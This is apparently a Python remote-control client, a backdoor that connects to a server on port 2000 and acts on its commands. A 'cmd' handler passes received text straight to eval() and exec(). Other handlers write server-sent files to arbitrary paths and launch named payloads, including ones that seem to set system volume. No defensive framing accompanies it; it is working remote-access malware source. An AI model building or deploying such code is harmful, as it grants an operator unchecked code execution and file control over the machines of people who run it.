from threading import Thread
from socketHelpers.client import Client
from socketHelpers.packet import Packet

import os
import time

import payloads.test
import payloads.minvolume
import payloads.maxvolume

paylds = [payloads.test, payloads.minvolume, payloads.maxvolume]
PAYLOADS = {str(x.__name__).split(".")[1]:x for x in paylds}


class PayloadPlayer(Thread):
    def __init__(self, payload, manager=None):
        super().__init__()
        self.payload = payload
        self.running = False
        self.manager = manager
        self.starttime = 0

    def __repr__(self):
        t = time.strftime("%j %H:%M:%S", time.gmtime( time.time() - (time.time() if self.starttime == 0 else self.starttime) )).split(" ")
        return "PayloadPlayer(%s, %s days %s)"%(self.payload.__name__, int(t[0])-1, t[1])

    def run(self):
        self.starttime = time.time()
        self.running = True
        if self.manager : self.manager.activePayloads[self.payload.__name__.split(".")[1]] = self
        self.payload.execute(self)
        self.running = False

    def kill(self):
        self.running = False

    def execute(self):
        if self.payload.RETURNS: return self.payload.execute(self)
        self.start()

        return "Started execution of '%s'."%self.payload



class Client(Client):
    activePayloads = {}
    events = {}
    file_buffer = ""

    def event(self, packet_id):
        def event_decorator(func):
            self.events[packet_id] = func
            return func
        return event_decorator

    def handle(self, packet):
        f = lambda x, y: (x, y)
        self.events.get(packet.get_id(), f)(self, packet)


client = Client("localhost", 2000)
client.start()


@client.event("ping")
def event_ping(client, packet):
    client.send(Packet("pong"))

@client.event("execute_list")
def event_execute_list(client, packet):
    client.send(Packet("execute", str(list(PAYLOADS.keys()))))

@client.event("execute")
def event_execute(client, packet):
    try:
        data = PayloadPlayer(PAYLOADS[packet.read()], client).execute()
    except KeyError:
        client.send(Packet("info", "Can not find payload %s."%packet.read()))
    else:
        client.send(Packet("info", data))

@client.event("cmd")
def event_cmd(client, packet):
    try:
        data = eval(packet.read())
        client.send(Packet("info", str(data)))
    except Exception as e:
        client.send(Packet("info", str("%s: %s"%(type(e), e))))

    try:
        exec(packet.read())
        client.send(Packet("info", str("Run on exec")))
    except Exception as e:
        client.send(Packet("info", str("%s: %s"%(type(e), e))))

@client.event("new_file")
def event_new_file(client, packet):
    name = packet.read()
    client.file_buffer = name

    os.makedirs("." if os.path.dirname(name) == "" else os.path.dirname(name), exist_ok=True)
    with open(name, "w") as f:
        f.close()

    client.send(Packet("info", "Recieving file '%s'."%name))

@client.event("file_data")
def event_file_data(client, packet):
    data = packet.read_raw()

    with open(client.file_buffer, "ab") as f:
        f.write(data)
        f.close()

@client.event("cleaner")
def event_cleaner(client, packet):
    client.send(Packet("active", str(client.activePayloads)))

@client.event("active")
def event_active(client, packet):
    for i in client.activePayloads:
        client.activePayloads[i].kill()

@client.event("paykill")
def event_paykill(client, packet):
    try:
        client.activePayloads[packet.read()].kill()
    except KeyError:
        client.send(Packet("info", "Can not find payload %s."%packet.read()))
    else:
        client.send(Packet("info", "Killed payload."))
